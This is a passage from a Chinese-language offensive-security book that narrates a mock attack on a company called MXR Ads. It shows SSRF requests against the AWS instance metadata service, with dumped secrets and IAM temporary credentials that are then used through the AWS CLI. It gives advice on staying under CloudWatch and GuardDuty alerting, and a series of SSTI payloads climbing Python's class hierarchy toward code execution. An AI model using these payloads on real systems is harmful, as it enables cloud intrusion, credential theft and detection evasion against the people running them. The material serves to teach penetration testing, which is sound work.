![](img/961e81aef23040d0fbe348f58c055860_92_0.png)

Figure 5-9: AWS 元数据 URL 的输出

在图 5-9 底部的 Raw 部分，字符串 `1.0`、`2007-01-19`、`2007-03-01` 等是元数据端点的不同版本。与其指定特定日期，我们可以在路径中使用关键字 `/latest` 以获取尽可能多的数据，正如我们在下一节中将看到的那样。

这个输出当然证实了我们存在服务端请求伪造的有效案例。是时候造成一些破坏了！

### 服务端请求伪造

服务端请求伪造（SSRF）攻击涉及我们强制某个服务端应用程序向我们选择的域名发出 HTTP 请求。这有时会让我们访问内部资源或未受保护的管理面板。

### 探索元数据

我们开始收集运行此网页获取应用程序的机器的基本信息，同样使用 Burp 的拦截模式。在拦截我们的请求后，我们用十六进制编码的元数据 IP 替换原始请求的 URL，然后在末尾附加 AWS 的元数据 API 名称，如清单 5-1 所示。

> NOTE 在 AWS 上启动一台常规机器并开始探索元数据 API，以更好地了解可用的信息。你可以在 `https://amzn.to/2FFwvPn` 找到所有可用字段的列表。

#### AWS Region

```
http://0xa9fea9fe/latest/meta-data/placement/availability-zone
```
`eu-west-1a`

#### Instance ID

```
http://0xa9fea9fe/latest/meta-data/instance-id
```
`i-088c8e93dd5703ccc`

#### AMI ID

```
http://0xa9fea9fe/latest/meta-data/ami-id
```
`ami-02df9ea15c1778c9c`

#### Public hostname

```
http://0xa9fea9fe/latest/meta-data/public-hostname
```
`ec2-3-248-221-147.eu-west-1.compute.amazonaws.com`

Listing 5-1: 从元数据 API 获取的 Web 应用基本信息

从中我们可以看到演示应用运行在 `eu-west-1` 区域，表明是亚马逊在爱尔兰的数据中心之一。AWS 中有数十个可用区域。虽然公司努力将最重要的应用程序分布在多个区域，但辅助服务和有时后端往往集中在少数几个区域。实例 ID 是分配给 EC2 服务中每个虚拟机的唯一标识符，为 `i-088c8e93dd5703ccc` ①。在执行针对运行广告应用的机器的 AWS API 调用时，此信息可能很有用。

镜像 ID `ami-02df9ea15c1778c9c` ② 指的是用于运行机器的快照，例如 Ubuntu 或 CoreOS 镜像。机器镜像可以是公共的（可供所有 AWS 客户使用）或私有的（仅可供 specific accounts)。这个特定的 AMI ID 是私有的，因为它无法在 AWS EC2 控制台上找到。如果 AMI ID 不是私有的，我们本可以启动该快照的类似实例来测试未来的有效载荷或脚本。

最后，公共主机名为我们提供了通往运行演示应用程序的机器（或 AWS 术语中的 EC2 实例）的直接路径，前提是本地防火墙规则允许我们访问它。该机器的公共 IP 可以从其规范主机名推断出来：`3.248.221.147`。

说到网络配置，让我们从元数据 API 中提取防火墙配置，如清单 5-2 所示。了解存在哪些防火墙规则可以为你提供有关与此系统交互的其他主机以及可能在其上运行的服务的线索，即使它们不可公开访问。防火墙规则是在称为安全组的对象中管理的。

#### MAC address of the network interface

```
http://0xa9fea9fe/latest/meta-data/network/interfaces/macs/
```
`06:a0:8f:8d:1c:2a`

#### AWS Owner ID

```
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/owner-id
```
`886371554408`

#### Security groups

```
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/security-groups
```
`elb_http_prod_eu-west-1`

`elb_https_prod_eu-west-1`

`common_ssh_private_eu-west-1`

`egress_internet_http_any`

#### Subnet ID where the instance lives

```
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-id
```
`subnet-00580e48`

#### Subnet IP range

```
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-ipv4-cidr-block
```
`172.31.16.0/20`



### 清单 5-2：Web 应用的防火墙配置

我们需要网络的 MAC 地址来从元数据 API 中检索网络信息。AWS 账户所有者用于构建 Amazon 资源名称（ARN），它们是用户、策略以及 AWS 上几乎所有资源的唯一标识符；这是将在未来 API 调用中证明有用的重要信息。ARN 每个账户唯一，因此 MXR Ads 的账户 ID 为 `886371554408` 并且将保持不变——即使一家公司可能并且经常会有多个 AWS 账户，正如我们稍后将看到的那样。

我们只能列出安全组的名称，而不能列出实际的防火墙规则，但这已经足以猜测实际的防火墙规则。例如，`elb_http_prod_eu-west-1` 集合中的 `elb` 部分表明，该集合很可能授予负载均衡器访问服务器的权限。第三个安全组很有趣：`common_ssh_private_eu-west-1`。根据其名称，可以安全地假设只有少数几台机器，通常称为 `bastions`，才有能力通过 SSH 连接到其余基础设施。如果我们 somehow 能登陆其中一台珍贵的实例，那将打开许多、许多大门！有趣的是，我们仍然被困在组织之外，却已经可以感受到其基础设施设计理念。

### 元数据 API 的肮脏秘密

当然我们远未完成，所以让我们再提升一个档次。正如我们在第 3 章中看到的，AWS 提供了在机器首次启动时执行脚本的可能性。该脚本通常被称为 `user-data`。我们用它来设置自己的基础设施并引导 Docker 容器。好消息——同样的 `user-data` 可通过元数据 API 在一次查询中获得。通过向 MXR Ads 演示应用发送另一次 Burp 请求，我们可以看到他们肯定用它来设置自己的机器，如清单 5-3 所示。

#### User data information

`http://0xa9fea9fe/latest/user-data/`

#### cloud-config

① `coreos`:

  `units`:

  - `command`: `start`

    `content`: |-

      `[Unit]`

      `Description=Discover IPs for external services`

      `Requires=ecr-setup.service`

--snip--

*清单 5-3：机器首次启动时执行的 user-data 脚本片段*

我们在屏幕上看到数据流的洪流，填满了我们温暖而模糊的感觉。SSRF 在它所有的荣耀中。让我们检查一下这次命令得到的结果。

除了接受纯 bash 脚本外，`cloud-init` 还支持文件格式 `cloud-config`，它使用声明性语法来准备和安排启动操作。`cloud-config` 由许多发行版支持，包括 CoreOS，看起来是为这台机器提供动力的操作系统 ①。

`cloud-config` 使用 YAML 语法，该语法使用空白和换行符来分隔列表、值等等。`cloud-config` 文件描述了设置服务、创建账户、执行命令、写入文件以及执行启动操作中涉及的其他任务的指令。有些人认为它比粗糙的 bash 脚本更干净、更容易理解。

让我们分解我们检索到的 `user-data` 脚本中最重要的部分（参见清单 5-4）。

```
--snip--

- command: start

  content: |

  ① [Service]  # Set up a service

    EnvironmentFile=/etc/ecr_env.file # Env variables
```

```
② ExecStartPre=/usr/bin/docker pull ${URL}/demo-client:master

③ ExecStart=/usr/bin/docker run \
    -v /conf_files/logger.xml:/opt/workspace/log.xml \
    --net=host \
    --env-file=/etc/env.file \
    --env-file=/etc/java_opts_env.file \
    ④ --env-file=/etc/secrets.env \
    --name demo-client \
    ${URL}/demo-client:master \
--snip--
```

#### 清单 5-4：user-data 脚本的延续

首先，文件设置了一个在机器启动时执行的服务 ①。该服务拉取 `demo-client` 应用程序镜像 ② 并使用功能齐全的 `docker run` 命令运行容器 ③。

注意多个 `--env-file` 开关 ④，它们要求 Docker 从自定义文本文件加载环境变量，其中一个方便地命名为 `secrets.env`！当然，百万美元的问题是这些文件位于何处？

它们直接烘焙到 AMI 镜像中的可能性很小，但那样的话，对 MXR Ads 来说更新配置文件将是极其不便的。要更新数据库密码，公司需要烘焙并发布新的 CoreOS 镜像。效率不高。不，秘密文件很可能要么通过 S3 动态获取，要么直接嵌入到同一个 `user-data` 脚本中。的确，如果我们再向下滚动一点，我们会遇到以下片段：

```
--snip--

write_files:

- content: H4sIAEJwoV0AA13OzU6DQBSG4T13YXoDQ5FaTFgcZqYyBQbmrwIjmcT+Y4Ed6/...

  encoding: gzip+base64

  path: /etc/secrets.env

  permissions: "750"

--snip--
```

精彩。这个 blob 的内容是 base64 编码的，所以我们将对其进行解码、解压缩，并惊叹于其内容，如清单 5-5 所示。

```
root@Point1:~# echo H4sIAAA...|base64 -d |gunzip

ANALYTICS_URL_CHECKSUM_SEED = 180309210013

CASSANDRA_ADS_USERSYNC_PASS = QZ6bhOW1CprQPetIhtSv

CASSANDRA_ADS_TRACKING_PASS = 68niNN TIPA e5sDJZ4gPd

CASSANDRA_ADS_PASS = fYk5Z5ByOEkoJNq1cMM3

CASSANDRA_ADS_DELIVERYCONTROL_PASS = gOMUUHsVuuUyo003jqFU

IAS_AUTH_PASS = Pj07wnHF9RBHD2ftwXjm

ADS_DB_PASSWORD = !uqQ#?:9#3Rd_cM]
```

#### 清单 5-5：包含密码的已解码 secrets.env 文件片段

Jackpot！该 blob 提供了许多访问 Cassandra 集群的密码（Cassandra 是一种高度弹性的 NoSQL 数据库，通常部署用于以最小延迟处理大规模数据）。我们还获得了两个晦涩的密码，蕴含着未知的潜力。当然，仅凭密码是不够的。我们需要相关的主机机器和用户名，但应用程序也需要，所以我们可以假设清单 5-4 中的第二个环境文件 `env.file` 应该包含所有缺失的部分。

然而，进一步向下滚动 `user-data`，我们找不到 `env.file` 的定义。但我们确实遇到了一个 shell 脚本，`get-region-params.sh`，它似乎会重置我们珍贵的 `env.file`（参见清单 5-6）。

```
--snip--

- command: start

  content: |-

    [Unit]

    Description=Discover IPs for external services

    [Service]

    Type=oneshot

    ExecStartPre=/usr/bin/rm -f /etc/env.file

    ExecStart=/conf_files/get-region-params.sh

  name: define-region-params.service

--snip--
```

#### 清单 5-6：似乎与 env.file 交互的发现服务

这个脚本很可能会创建 `env.file`。让我们深入研究 `get-region-params.sh` 的内容，它在下面三行创建（参见清单 5-7）。

```
--snip--

write_files:

  ① - content: H4sIAAAAAAC/7yabW/aShbH3/

    tTFmu0mjXOIml6Xoj9b8AQ6wSG9l0peyDrME+...

    encoding: gzip+base64

    path: /conf_files/define-region-params.sh



#### 清单 5-7：负责在 user-data 脚本中创建 `get-region-params.sh` 的行

我们又有一个编码的 blob ①。使用一些 `base64` 和 `gunzip` 魔法，我们将这堆垃圾翻译成一个正常的 `bash` 脚本，该脚本根据机器运行的区域定义各种端点、用户名和其他参数（参见清单 5-8）。我将跳过许多条件分支和 `case` `switch` 语句，只打印相关部分。

```
root@Point1:~# echo H4sIAAA...|base64 -d |gunzip
```

```
AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)

REGION=${AZ%?}

case $REGION in

  ap-southeast-1...

  ;;

  eu-west-1

    echo "S3BUCKET=mxradr-d1" >> /etc/env.file ①

```
```
echo "S3MISC=mxrads-misc" >> /etc/env.file ①
echo "REDIS_GEO_HOST=redis-geolocation.production.euw1.mxrads.tech" >> /etc/env.file
echo "CASSA_DC=eu-west-delivery" >> /etc/env.file
echo "CASSA_USER_SYNC=usersync-euw1" >> /etc/env.file
echo "CASSA_USER_DLVRY=userdc-euw1" >> /etc/env.file
--snip--

cassandra_delivery_host="cassandra-delivery.prod.${SHORT_REGION}.mxrads.tech"

--snip--
```

#### 清单 5-8：解码后的 `get-region-params.sh` 脚本片段

注意我们在先前的侦察中遇到的 S3 存储桶 `mxrads-dl` ① 和 `mxrads-misc` ②。

查看脚本，我们可以看到实例正在使用元数据 API 来检索其自身的区域，并基于该信息构建端点和用户名。这是公司迈向基础设施韧性的第一步：它打包一个应用，毋宁说是一个环境，可以在任何虚拟化平台、任何数据中心、任何国家运行。确实很强大，当然有一个警告，正如我们亲眼所见，一个简单的 SSRF 漏洞就可能让愿意尝试的人获取应用的所有秘密。

> 注意 AWS 于 2019 年 12 月发布了元数据 API v2，它要求先进行一次 PUT 请求来检索会话令牌。只有在出示有效令牌的情况下才能查询元数据 API v2。这一限制有效地阻止了 SSRF 等攻击。你可能会想这似乎是个好计划，但随后 AWS 却用以下声明“打死了警长”：“现有的实例元数据服务（IMDSv1）是完全安全的，AWS 将继续支持它。”啊，当然公司会投资重写整个部署流程，以替换一个已经安全的系统。看起来 SSRF 未来依然光明。

将此文件与我们在清单 5-5 中获得的密码进行交叉引用，并根据变量名做出合理推测，我们可以重建以下凭据：

#### `cassandra-delivery.prod.euw1.mxrads.tech`

用户名: `userdc-euw1`
密码: `gQMUUHsVuuUyo003jqFU`

#### `cassandra-usersync.prod.euw1.mxrads.tech`

用户名: `usersync-euw1`
密码: `QZ6bhOWiCprQPetIhtSv`

部分机器缺少用户名，其他密码缺少对应的主机名，但我们会随着时间弄清楚所有情况。目前，这就是我们能完全拼凑出来的全部内容。

有了这些信息，阻止我们访问这些数据库的唯一因素就是基础且乏味的防火墙规则。这些端点解析为内部 IP，无法从我们的攻击服务器所在的互联网黑暗角落访问，因此除非我们想办法更改这些防火墙规则或完全绕过它们，否则我们只能得到一堆毫无价值的凭据。

Well, 那并不完全正确。我们尚未获取的一组凭据，与之前的不同，通常不受 IP 限制：机器的 IAM 角色。

在大多数云服务提供商中，你可以为机器分配一个角色，这是一组默认凭据。这使机器能够无缝地向云服务提供商进行身份验证，并继承分配给该角色的任何权限。机器上运行的任何应用程序或脚本都可以声明该角色，这避免了在代码中硬编码密钥的不良习惯。看起来很完美……再次强调，仅在纸面上。

实际上，当 EC2 机器（更准确地说，是实例配置文件）冒充 IAM 角色时，它会检索一组体现该角色权限的临时凭据。这些凭据通过——你猜对了——元数据 API 提供给机器。

我们调用 `/latest/meta-data/iam/security-credentials` 端点来检索角色的名称：

```
http://0xa9fea9fe/latest/meta-data/iam/security-credentials

demo-role.ec2
```

我们可以看到机器被分配了 `demo-role.ec2` 角色。让我们再次通过调用元数据 API 来获取其临时凭据：

```
#### Credentials
http://0xa9fea9fe/latest/meta-data/iam/security-credentials/demo-role.ec2

{
Code : Success,
LastUpdated : 2020-10-26T11:33:39Z,
Type : AWS-HMAC,
AccessKeyId : ASIA4A2RK6WS4HX6YCC7,
SecretAccessKey : nMy1mmbhHcOnXw2eZ3oh6nh/w2StPw8dI5Mah2b,
Token : AgoJb3JpZ1luX2VjEFQ...
Expiration : 2020-10-26T17:53:41Z ①
}
```

我们获得了 `AccessKeyId` 和 `SecretAccessKey`，二者共同构成经典的 AWS API 凭据，以及一个验证这组临时凭据的访问令牌。

理论上，我们可以将这些密钥加载到任何 AWS 客户端中，并使用机器的身份 `demo-role.ec2` 从世界任何 IP 地址与 MXR Ads 的账户进行交互。如果该角色允许机器访问 S3 存储桶，我们就可以访问这些存储桶。如果机器可以终止实例，现在我们也可以。我们可以在凭据重置 ① 之前的接下来六小时内接管此实例的身份和权限。

当此宽限期到期后，我们可以再次检索一组新的有效凭据。现在你明白为什么 SSRF 是我新的好朋友了。这里我们在主目录下以配置文件名 `demo` 注册 AWS 凭据：

```
#### On our attacking machine
root@Point1:~/# vi ~/.aws/credentials

[demo]

aws_access_key_id = ASIA44ZRK6WSX2BRFIXC
aws_secret_access_key = +ACjXR87naNXyKKJwmW/5r/+B/+J5PrsmBZ
aws_session_token = AgoJb3pZ2l...
```

看起来我们势头正猛！不幸的是，就在我们开始收紧对目标的控制时，AWS 又给了我们另一记打击：IAM。

注意 我们可以通过在常规 AWS CLI 命令后附加开关 `--profile demo` 来使用这些特定的 AWS 凭据，或通过设置全局变量 `AWS_PROFILE=demo`。

### AWS IAM

AWS IAM 是身份验证和授权服务，可能有点像泥潭。默认情况下，用户和角色几乎没有任何权限。他们无法查看自己的信息，例如用户名或访问密钥 ID，因为即使这些琐碎的 API 调用也需要明确的权限。

注意 将 AWS IAM 与 Active Directory（AD）环境进行比较，在 AD 环境中，用户默认不仅可以获取每个账户的信息和组成员身份，还可以获取服务账户的哈希密码。查看 AD Kerberoasting 技术：http://bit.ly/2tQDQJm。

显然，像开发者这样的普通 IAM 用户有一些基本的自我检查权限，以便他们可以执行列出组成员身份之类的操作，但对于附加到机器的实例配置文件来说则完全不是这样。当我们尝试获取有关角色 `demo-role-ec2` 的基本信息时，我们得到一个惊人的错误：

```
#### On our attacking machine
root@Point1:~/# aws iam get-role \
--role-name demo-role-ec2 \
--profile demo
```



An error occurred (`AccessDenied`) when calling the `GetRole` operation: User: `arn:aws:sts::886371554408:assumed-role/demo-role.ec2/i-088c8e93dd5703ccc` is not authorized to perform: `iam:GetRole` on resource: role `demo-role-ec2`

应用程序通常不会在运行时评估其权限集；它只是按照代码指示执行 API 调用并相应地行动。这意味着我们拥有有效的 AWS 凭据，但目前我们完全不知道如何使用它们。

我们必须做一些研究。几乎每个 AWS 服务都有一些 API 调用可以描述或列出其所有资源（EC2 的 `describe-instances`，S3 的 `list-buckets` 等）。因此，我们可以慢慢开始探测最常见的服务，看看可以用这些凭据做什么，并逐步测试 AWS 的各种服务。

一个选择是发疯一样尝试每一种可能的 AWS API 调用（有成千上万个），直到命中一个授权的查询，但在此过程中触发的错误雪崩会让任何安全团队从冬眠中惊醒。默认情况下，大多数 AWS API 调用都会被记录，因此公司很容易设置警报来跟踪未授权调用的数量。为什么不呢？只需通过监控服务 `CloudWatch` 几次点击即可设置这些警报。

此外，AWS 提供了一项名为 `GuardDuty` 的服务，可自动监控并报告各种异常行为，例如发送 5,000 次 API 调用，因此谨慎至关重要。这不是你平均的银行，有 20 台安全设备和每年 20 万美元的外包 SOC 团队，仍在努力聚合和解析 Windows 事件。我们需要聪明，并纯粹从上下文中进行推理。

例如，记得那个进入此实例 `user-data` 的 `mxrads-dl` S3 存储桶吗？在没有凭据的情况下我们之前无法访问它，但也许 `demo-role.ec2` 角色有一些 S3 权限可以授予我们访问权限？我们通过调用 AWS API 列出 MXR Ads 的 S3 存储桶来找出答案：

#### On our attacking machine

```
root@Point1:~/# aws s3api listbuckets --profile demo

An error occurred (AccessDenied) when calling the ListBuckets operation:

Access Denied
```

好吧，尝试列出账户中所有 S3 存储桶有点太冒进了，但值得一试。让我们退一步，现在采取小步前进。再次使用 `demo-role.ec2` 角色，我们尝试仅列出 `mxrads-dl` 存储桶中的键。记住，我们之前在没有凭据的情况下被拒绝访问：

```
root@Point1:~/# aws s3api list-objects-v2 --profile demo --bucket mxrads-dl >
list_objects_dl.txt

root@Point1:~/# grep ""Key"" list_objects_dl | sed 's/["\,]//g' >
list_keys_dl.txt

root@Point1:~/# head list_keys_dl.txt

    Key: jar/maven/artifact/com.squareup.okhttp3/logging-interceptor/4.2.2

    Key: jar/maven/artifact/com.logger.log/logging-colors/3.1.5

--snip--
```

现在我们开始有所进展了！我们获取了一个键列表并保存下来。作为预防措施，在我们发疯般下载存储桶中每个文件之前，我们可以确保 S3 对象操作上的日志记录确实已禁用。我们调用 `get-bucket-logging` API：

```
root@Point1:~/# aws s3api get-bucket-logging --profile demo --bucket mxrads-dl

<empty_response>
```

我们发现它是空的。没有日志。完美。你可能在想为什么对这个晦涩的 API 的调用会成功。实例配置文件为什么需要这样的权限呢？要理解这种奇怪的行为，请查看 https://docs.aws.amazon.com/ 上可能存在的 S3 操作完整列表。是的，可以在存储桶上允许或拒绝的操作有数百种。

AWS 在为每个微小且有时无关紧要的任务定义非常细粒度的权限方面做得非常出色。难怪大多数管理员在设置存储桶时简单地分配通配符权限。用户需要对存储桶的只读访问？`Get*` 就能完成工作；他们很少意识到 `Get*` 仅在 S3 上就隐含了 31 项权限！`GetBucketPolicy` 用于获取策略，`GetBucketCORS` 用于返回 CORS 限制，`GetBucketACL` 用于获取访问控制列表，等等。

存储桶策略主要用于向外部 AWS 账户授予访问权限，或在授予用户的过于宽松的 IAM 策略前增加另一层保护。因此，拥有 `s3:*` 权限的用户可能会因存储桶策略而被拒绝，该策略仅允许某些用户或要求特定的源 IP。在此，我们尝试获取 `mxrads-dl` 的存储桶策略，看看它是否向其他 AWS 账户授予了访问权限：

```
root@Point1:~# aws s3api get-bucket-policy --bucket mxrads-dl

{
  "Id": "Policy1572108106689",
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Stmt1572108105248",
      "Action": [
        "s3:List*", "s3:Get*"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::mxrads-dl",
      "Principal": { ① "AWS": "arn:aws:iam::983457354409:root" }
    }
  ]
}
```



该策略引用了外部 AWS 账户 `983457354409` ①。该账户可能是 Gretsch Politico，是 MXR Ads 内部拥有自己 AWS 账户的部门，或者是开发人员的个人账户。我们目前还不能确定。我们会将其记录下来以便稍后检查。

#### Examining the Key List

我们回到下载存储桶的整个键列表并深入堆中，希望找到敏感数据并了解存储桶的用途。我们有大量公开的二进制文件和 `.jar` 文件。我们发现了不同版本的主要软件集合，例如 Nginx、Java 集合和 Log4j。看起来他们复制了一些公共分发点。我们还找到了几个 bash 脚本，它们可以自动化 `docker login` 命令或为 AWS 命令提供辅助函数，但没有任何内容显得敏感。

由此我们推断，该存储桶可能充当公司范围内的软件包分发中心。系统和应用程序必须使用它来下载软件更新、软件包、归档文件和其他广泛使用的软件包。我想并非每个公开的 S3 都是等待被掠夺的埃尔多拉多。

我们转向之前提取的用户数据脚本，希望获得有关要查询服务的额外线索，但没有发现任何值得注意的内容。我们甚至出于绝望，使用演示角色凭据尝试了几个针对常见服务如 EC2、Lambda 和 Redshift 的 AWS API，却只得到那种美味的错误消息。拥有有效的密钥却只能困在前门，因为有上千个钥匙孔可尝试，这有多令人沮丧……但有时候事情就是这样。

就像大多数死胡同一样，唯一的前进方式是至少暂时后退。我们迄今为止收集的数据并非无用；我们拥有数据库和 AWS 凭据，未来可能会派上用场，最重要的是，我们对公司如何处理其基础设施有了一些了解。我们只需要一点小小的火花，整个牧场就会燃起。我们仍有近一百个域名需要检查。我们会到达那里的。

### Resources

- 如果您不熟悉该工具，请参阅 Burp 的简短介绍：http://bit.ly/2QEQmo9。
- 在 http://flaws.cloud/ 查看渐进式的夺旗练习，以熟悉基本的云黑客反应。
- CloudBunny 和 fav-up 是可以帮助您找出隐藏在 CDN 后面的服务的 IP 地址的工具：https://github.com/Warflop/CloudBunny/ 和 https://github.com/pielco11/fav-up/。
- 您可以在以下链接阅读更多关于发现存储桶名称的技术：http://bit.ly/36KVQn2 和 http://bit.ly/39Xy6ha。
- CNAME 和 ALIAS 记录之间的区别在 http://bit.ly/2FBWoPU 中有讨论。
- 如果您想快速搜寻，这个网站列出了一些开放的 S3 存储桶：https://buckets.grayhatwarfare.com/。
- 有关 S3 存储桶策略的更多信息可在以下位置找到：https://amzn.to/2Nbhngy。
- 有关 WebSockets 的进一步阅读可在 http://bit.ly/35FsTHN 获取。
- 查看这篇关于 IMDSv2 的博客：https://go.aws/35EzJgE。

## PART III

### TOTAL IMMERSION

> *Lack of comfort means we are on the threshold of new insights.*
> Lawrence Krauss

## 6

### FRACTURE

![](img/961e81aef23040d0fbe348f58c055860_107_0.png)

从目前的工作来看，我们获得了几个 MXR Ads 凭据，并发现了 MXR Ads 和 GP 处理其基础设施的主要方式，但我们不确定该如何利用我们的发现。我们仍有许多机会可以探索，因此我们回到原点：我们在第 4 章中确认的几个 GP 和 MXR Ads 网站（见列表 4-3）。在第 5 章中，我们凭直觉追求最诱人的资产，即 S3 存储桶，这最终导致我们发现了一个服务器端请求伪造（SSRF）漏洞。但现在我们将采用更稳健、更艰苦的方法。

我们将逐一浏览每个网站，跟踪每个链接，检查每个参数，甚至使用类似 LinkFinder（https://github.com/GerbenJavado/LinkFinder/）的东西收集 JavaScript 文件中的隐藏链接。为此，我们会在表单和字段中注入精心挑选的特殊字符，直到触发异常，例如明确的数据库错误、404（未找到页面）错误或意外的重定向到主页面。

我们将依赖 Burp 来捕获所有秘密发送到服务器的参数。此操作在很大程度上取决于网站背后的 Web 框架、编程语言、操作系统以及其他一些因素，因此为了简化流程，我们将注入以下有效载荷并将其输出与应用程序的正常响应进行比较：

```
dddd", ' |&$;:`{{@{%<=ddd
```

这个字符串涵盖了不同框架注入漏洞最明显的出现情况：（No）SQL、系统命令、模板、轻量级目录访问协议（LDAP），以及几乎任何使用特殊字符扩展其查询接口的组件。`dddd` 部分就像一个标签，一些易于识别的文本，帮助我们在页面的响应中视觉定位有效载荷。如果页面对这个字符串有哪怕一点点意外的反应，例如出现错误页面、好奇的重定向、截断的输出，或输入参数以奇怪的方式在页面中反射，那就是值得进一步调查的有希望的线索。如果网页返回一个无害的响应，但似乎以某种方式转换或过滤了输入，那么我们可以使用更高级的有效载荷进一步探测，例如添加逻辑运算符（AND 1=0）、指向真实的文件位置、尝试真实的命令等等。

我们开始将此有效载荷注入列表中每个网站的表单中。很快，我们就到达了 URL `www.surveysandsats.com`，这是在第 4 章中发现的用于收集和探测人们性格数据的臭名昭著的网站。它有很多字段可以注入我们的放荡字符串。我们将其输入表单，点击提交，然后被图 6-1 中的令人愉快的错误页面迎接。

![](img/961e81aef23040d0fbe348f58c055860_108_0.png)

Figure 6-1: Surveysandstats.com reacts to our string injection

啊哈！这正是能让黑客因兴奋而颤抖的错误。我们转向 Burp 并再次提交表单，这次使用完全无害的调查问卷回答，没有特殊字符，只有纯英文，以确保表单正常工作（见图 6-2）。正常运行时，表单应该向我们发送电子邮件确认。

![](img/961e81aef23040d0fbe348f58c055860_108_1.png)

Figure 6-2: A regular form submission in Burp

And sure enough, a couple of seconds later, we receive an email with the results of the survey (see Figure 6-3).

![](img/961e81aef23040d0fbe348f58c055860_109_0.png)

*图 6-3：我们正常调查提交的电子邮件回复*

调查工作完全正常，这意味着很可能确实是我们负载中的某个特殊字符导致了第一次页面崩溃。为了确定是哪个字符，我们重新播放之前的正常表单条目，每次添加负载中的一个特殊字符，直到锁定嫌疑对象：`{{`（双大括号）。我们很可能正在处理服务器端模板注入（SSTI），因为模板通常依赖双大括号。

#### 服务器端模板注入

在许多 Web 开发框架中，模板是简单的 HTML 文件，其中标注了特殊变量，这些变量在运行时会被动态值替换。以下是各种框架中使用的一些特殊变量：

```
#### Ruby templates

<p>

<%= @product %>

</p>

#### Play templates (Scala/Java)

<p>

Congratulations on product @product

</p>

#### Jinja or Django templates

<p>

Congratulations on product {{product}}

</p>
```

前端（在 HTML/JavaScript 中可视化）和后端（Python/Ruby/Java 中的控制器或模型）之间的这种分离是许多开发框架以及许多团队组织的基石。有趣的地方在于，当模板本身使用不可信的输入动态构建时就会开始。例如，下面的代码。它使用 `render_template_string` 函数生成动态模板，该函数本身也是使用用户输入构建的：

```
--snip--

template_str = """

    <div>

        <h1>hello</h1>

<h3>%s</h3>

</div>

""" % user_input

return render_template_string(template_str)
```



在此 Python 片段中，如果我们在 `user_input` 变量中注入一个有效的模板指令，如 `{{8*2}}`，它将被 `render_template_string` 方法计算为 `16`，这意味着页面将显示结果 `16`。棘手的是，每个模板引擎都有自己的语法，因此并非所有引擎都会以这种方式进行评估。虽然有些允许你读取文件并执行任意代码，但其他一些甚至不允许你执行简单的乘法。

这就是为什么我们首先要做的是收集有关此潜在漏洞的更多信息。我们需要弄清楚我们处理的是什么语言以及它运行的是哪个框架。

### 指纹识别框架

自从 James Kettle 在 Black Hat USA 2015 上关于 SSTI 的演讲以来，他描绘模板框架指纹识别方法的著名图表已被复制到你可能遇到的关于此漏洞的每篇文章中，包括这里的图 6-4。为了探索其工作原理，我们将在调查表单中输入几个不同的表达式，看看它们是如何执行的。

![](img/961e81aef23040d0fbe348f58c055860_110_0.png)

图 6-4：用于指纹识别模板框架的不同 SSTI 有效载荷

我们发送有效载荷 `{{8 * '2'}}`，并在响应中收到一封电子邮件，其中包含字符串 `2` 重复总共八次，如图 6-5 所示。这种行为是 Python 解释器的典型特征，而例如 PHP 环境则会打印 `16`：

```
#### Payload

{{8* '2'}} # Python: 22222222, PHP: 16

{{8*2}} # Python: 16, PHP: 16
```

![](img/961e81aef23040d0fbe348f58c055860_111_0.png)

图 6-5：输入 8 * '2' 时典型的 Python 输出

从中我们很快得出结论，我们很可能正在处理 Python 环境中著名的 Jinja2 模板。Jinja2 通常运行在两个主要的 Web 框架之一上：Flask 或 Django。曾经有一段时间，快速查看 `Server` HTTP 响应头就会显示哪个。遗憾的是，现在没有人再将 Flask/Django 应用程序裸露在互联网上了。它们会通过 Apache 和 Nginx 服务器，或者在这种情况下，通过覆盖原始服务器指令的 AWS 负载均衡器进行传输。

不用担心。有一种快速的有效载荷适用于 Flask 和 Django Jinja2 模板，而且效果很好：`request.environ`。在两个框架中，此 Python 对象都保存有关当前请求的信息：HTTP 方法、标头、用户数据，最重要的是，应用程序加载的环境变量。

```
#### Payload

email=davidshaw@pokemail.net&user={{request.environ}}...
```

图 6-6 显示了我们从此有效载荷获得的响应。

![](img/961e81aef23040d0fbe348f58c055860_111_1.png)

图 6-6：来自 `request.environ` 的响应

Django 字面出现在 `PYENV_DIR` 路径中。中奖了。似乎该应用程序的开发人员决定用更强大的 Jinja2 模板框架替换默认的 Django 模板引擎。这对我们来说很幸运，因为虽然 Jinja2 支持 Python 表达式和操作的子集，使其在性能和生产力方面具有优势，但这种灵活性代价高昂：我们可以操作 Python 对象、创建列表、调用函数，在某些情况下甚至加载模块。

### 任意代码执行

几乎很诱人直接跳过去尝试使用类似 `{{os.open('/etc/passwd')}}` 的有效载荷访问密码文件，但那样行不通。`os` 对象很可能未在应用程序的当前上下文中定义。我们只能与在响应中呈现页面时定义的 Python 对象和方法进行交互。我们之前访问的 `request` 对象会自动由 Django 传递给模板，因此我们可以自然地检索它。`os` 模块？极不可能。

但是，这是一个最幸运的但是，大多数现代编程语言都为我们提供了一定程度的内省和反射——反射是指程序、对象或类能够检查自身的能力，包括列出自己的属性和方法、更改其内部状态等等。这是 C#、Java、Swift 等许多高级语言的常见功能——Python 也不例外。任何 Python 对象都包含指向其自身类属性及其父类的属性和指针。

例如，我们可以使用 `__class__` 属性获取任何 Python 对象的类，该属性返回一个引用此类的有效 Python 对象：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__}}...

<class 'django.core.handlers.wsgi.WSGIRequest'>
```

该类本身是更高 Python 对象 `django.http.request.HttpRequest` 的子类的子级。我们甚至不必阅读文档就能找到这一点；它写在对象本身中，在 `__base__` 变量中，正如我们用此有效载荷所看到的那样：

```
#### Payload

email=davidshaw@pokemail.net&user={{request.__class__.__base__}}...

<class 'django.http.request.HttpRequest'>

email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__}}...

<class 'object'> ①
```

我们继续沿着继承链攀爬，在有效载荷中添加 `__base__`，直到到达最顶层的 Python 对象 ①，即所有类的父类：`object`。`object` 类本身毫无用处，但与其他类一样，它也包含对其子类的引用。因此，在攀爬链之后，现在是时候使用 `__subclasses__` 方法向下去了：

```
#### Payload

